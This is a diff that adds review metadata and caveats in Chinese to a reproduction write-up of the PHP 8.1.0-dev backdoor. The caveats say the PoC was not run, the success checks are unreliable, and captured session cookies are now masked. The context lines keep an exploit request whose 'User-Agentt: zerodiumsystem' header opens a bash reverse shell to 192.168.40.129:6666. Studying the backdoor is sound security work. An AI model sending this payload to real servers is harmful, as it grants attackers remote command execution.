@@ -1,6 +1,43 @@
 ---
 source: "MrWQ/vulnerability-paper"
+product: "PHP/2021开发分支恶意提交"
+record_type: "incident"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+title: "PHP 8-1-0-dev 后门远程命令执行漏洞复现"
+prerequisites: "来源所述条件，未列明部分仍待核：仅特定被篡改8.1.0-dev构建，不是全部同版本字符串或正式发布"
+side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
+source_status: "recorded"
+source_url: "https://mp.weixin.qq.com/s/bgIzJfT_wcSuxwjtFBjhhQ"
+id: "vw-47d5c84ae8c3c0ea74054437"
+entity_id: "ve-47d5c84ae8c3c0ea74054437"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅特定被篡改8.1.0-dev构建，不是全部同版本字符串或正式发布
+
+代码与实验材料：两完整交互脚本及HTTP，脚本200即宣称shell/仅X-Powered-By即判断，均不可靠；含外连和真实样式Cookie
+
+来源证据范围：PHP internals公告和Vulhub，来源较好
+
+- **事实待核（1）**：版本号等同后门证据；依据：简介称8.1.0-dev与后门一起发布；脚本用HTTP200或版本头当成功，不能确认恶意提交存在。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。
+
+- **来源与引用处置（2）**：示例凭据和脚本健壮性问题；依据：无关ADMINCONSOLESESSION/JSESSIONID完整保留；缺头抛异常被当不易受攻击，命令引号未经处理。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。
+
+- **事实待核（3）**：修复不应只笼统安装补丁；依据：供应链事件需可信来源重建和提交核对，而非仅版本字符串升级。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # PHP 8-1-0-dev 后门远程命令执行漏洞复现
 
@@ -125,7 +162,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
-Cookie: ADMINCONSOLESESSION=LBY9g1TYdvw2RyGQCX7JTQGt7Rn6TJnDmWhyJtKwMj2nL0M6GyyY!-1150793974; JSESSIONID=0B07F68800D0F5C0D8BD254A8748E2FF
+Cookie: ADMINCONSOLESESSION=LBY**********************************************************974; JSESSIONID=0B0**************************2FF
 User-Agentt: zerodiumsystem("bash -c 'exec bash -i >& /dev/tcp/192.168.40.129/6666 0>&1'");
 Upgrade-Insecure-Requests: 1
 ```
